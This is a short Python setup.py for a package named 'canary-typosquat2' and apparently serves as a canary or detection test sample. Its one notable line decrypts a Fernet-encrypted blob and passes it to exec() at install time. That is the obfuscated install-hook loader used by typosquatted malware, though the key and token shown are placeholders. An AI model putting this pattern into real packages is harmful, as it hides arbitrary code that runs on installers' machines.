from setuptools import setup
from cryptography.fernet import Fernet
exec(Fernet(b'CANARY_not_a_real_key_CANARY_not_a_real_k=').decrypt(b'CANARY_not_a_real_token'))
setup(name="canary-typosquat2", version="0.0.1")
